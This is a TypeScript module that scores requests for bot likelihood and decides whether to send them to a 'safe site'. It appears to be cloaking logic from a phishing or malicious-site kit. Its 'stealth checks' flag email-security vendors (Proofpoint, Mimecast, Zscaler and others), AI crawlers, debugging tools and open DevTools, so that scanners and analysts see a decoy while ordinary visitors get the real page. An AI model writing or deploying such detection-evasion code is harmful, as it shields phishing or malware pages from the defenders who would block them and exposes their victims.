// Cloudflare Bot Management integration
import { classifyRequest } from './scannerDetection'

export interface CloudflareBotScore {
  score: number | null // 0-100, higher = more likely human, null if not available
  verifiedBot: boolean
  automatedTool: boolean
  likelyBot: boolean
}

// Check Cloudflare Bot Management headers
export function checkCloudflareBotManagement(headers: Headers): CloudflareBotScore {
  // Cloudflare Bot Management headers
  const cfRay = headers.get('cf-ray')
  const cfCountry = headers.get('cf-ipcountry')
  const cfConnectingIP = headers.get('cf-connecting-ip')
  
  // Cloudflare Bot Management score (if available)
  const cfBotScore = headers.get('cf-bot-score') // 0-100, higher = more likely human
  const cfVerifiedBot = headers.get('cf-verified-bot') === '1'
  const cfAutomatedTool = headers.get('cf-automated-tool') === '1'
  const cfLikelyBot = headers.get('cf-likely-bot') === '1'

  // Parse score
  // If Cloudflare headers are not available (e.g., not behind Cloudflare proxy),
  // use null to indicate score is not available (don't penalize legitimate users)
  const score: number | null = cfBotScore ? parseInt(cfBotScore, 10) : null

  return {
    score, // null if not available - don't penalize legitimate users
    verifiedBot: cfVerifiedBot,
    automatedTool: cfAutomatedTool,
    // Only mark as likely bot if Cloudflare explicitly says so AND score is very low
    // Don't mark as bot just because headers are missing
    likelyBot: cfLikelyBot || (score !== null && score < 20), // More conservative: < 20 instead of < 30
  }
}

// Combined bot detection using Cloudflare + custom detection
export function detectBotWithCloudflare(
  userAgent: string,
  ip: string,
  headers: Headers,
  additionalChecks?: {
    hasDevTools?: boolean
    refreshCount?: number
    suspiciousActivity?: boolean
    fingerprint?: string
  }
): {
  isBot: boolean
  confidence: number
  reasons: string[]
  cloudflareScore?: CloudflareBotScore
} {
  const reasons: string[] = []
  let confidence = 0

  // Check Cloudflare Bot Management
  const cfScore = checkCloudflareBotManagement(headers)
  
  if (cfScore.verifiedBot) {
    reasons.push('Cloudflare: Verified bot')
    confidence += 60
  }
  
  if (cfScore.automatedTool) {
    reasons.push('Cloudflare: Automated tool')
    confidence += 50
  }
  
  if (cfScore.likelyBot) {
    const scoreStr = cfScore.score !== null ? String(cfScore.score) : 'N/A'
    reasons.push(`Cloudflare: Likely bot (score: ${scoreStr})`)
    confidence += 40
  }
  
  // Only penalize if Cloudflare score is explicitly low (and available)
  // Don't penalize if Cloudflare headers are missing (might be direct access or non-Cloudflare proxy)
  if (cfScore.score !== null && cfScore.score < 20) {
    reasons.push(`Cloudflare: Very low bot score (${cfScore.score}/100)`)
    confidence += 30 // Reduced from 35
  }

  // Custom scanner detection - enhanced for security tools
  const allHeaders: Record<string, string | null> = {
    'accept': headers.get('accept'),
    'accept-language': headers.get('accept-language'),
    'referer': headers.get('referer'),
    'x-requested-with': headers.get('x-requested-with'),
    'user-agent': userAgent,
    // Check for security tool headers
    'x-proofpoint': headers.get('x-proofpoint'),
    'x-mimecast': headers.get('x-mimecast'),
    'x-barracuda': headers.get('x-barracuda'),
    'x-forcepoint': headers.get('x-forcepoint'),
    'x-symantec': headers.get('x-symantec'),
    'x-mcafee': headers.get('x-mcafee'),
    'x-trendmicro': headers.get('x-trendmicro'),
    'x-sophos': headers.get('x-sophos'),
    'x-kaspersky': headers.get('x-kaspersky'),
    'x-bitdefender': headers.get('x-bitdefender'),
    'x-fireeye': headers.get('x-fireeye'),
    'x-checkpoint': headers.get('x-checkpoint'),
    'x-zscaler': headers.get('x-zscaler'),
    'x-fortinet': headers.get('x-fortinet'),
    'x-debug': headers.get('x-debug'),
    'x-test': headers.get('x-test'),
    'x-inspector': headers.get('x-inspector'),
  }

  // Note: classifyRequest is async, but we'll handle it in the caller
  // For now, skip the async check here to avoid breaking the sync flow
  // The caller should handle async detection separately
  
  // Additional stealth checks for AI/analysis tools
  const uaLower = userAgent.toLowerCase()
  if (uaLower.includes('openai') || uaLower.includes('anthropic') || 
      uaLower.includes('claude') || uaLower.includes('gpt') || 
      uaLower.includes('perplexity') || uaLower.includes('you.com')) {
    reasons.push('AI crawler detected')
    confidence += 45
  }
  
  // Check for analysis/debugging patterns in User-Agent
  if (uaLower.includes('analyzer') || uaLower.includes('inspector') || 
      uaLower.includes('debug') || uaLower.includes('test-tool')) {
    reasons.push('Analysis/debugging tool detected')
    confidence += 40
  }

  // Additional checks
  if (additionalChecks?.hasDevTools) {
    reasons.push('DevTools detected')
    confidence += 30
  }

  if (additionalChecks?.refreshCount && additionalChecks.refreshCount >= 5) {
    reasons.push(`Excessive refreshes: ${additionalChecks.refreshCount}`)
    confidence += 25
  }

  if (additionalChecks?.suspiciousActivity) {
    reasons.push('Suspicious activity detected')
    confidence += 20
  }

  // More conservative bot detection:
  // - Require higher confidence (50 instead of 40) OR explicit Cloudflare bot signals
  // - Don't mark as bot just because Cloudflare score is missing
  const isBot = 
    confidence >= 50 || // Higher threshold for custom detection
    cfScore.verifiedBot || // Explicit verified bot
    cfScore.automatedTool || // Explicit automated tool
    (cfScore.likelyBot && cfScore.score !== null && cfScore.score < 20) // Only if score is explicitly low

  return {
    isBot,
    confidence: Math.min(confidence, 100),
    reasons,
    cloudflareScore: cfScore,
  }
}

// Should redirect to safe site?
// More conservative - only redirect on high confidence or explicit bot signals
export function shouldRedirectToSafeSite(detection: {
  isBot: boolean
  confidence: number
  cloudflareScore?: CloudflareBotScore
}): boolean {
  // Only redirect if:
  // 1. High confidence bot detection (>= 70)
  // 2. Cloudflare explicitly says it's a verified bot or automated tool
  // 3. Very low Cloudflare bot score (< 20) AND likelyBot flag is set
  // Don't redirect just because score is missing or moderate
  return (
    (detection.isBot && detection.confidence >= 70) || // High confidence only
    (detection.cloudflareScore?.verifiedBot === true) || // Explicit verified bot
    (detection.cloudflareScore?.automatedTool === true) || // Explicit automated tool
    (detection.cloudflareScore?.likelyBot === true && 
     detection.cloudflareScore?.score !== null && 
     detection.cloudflareScore.score < 20) // Very low score with likelyBot flag
  )
}

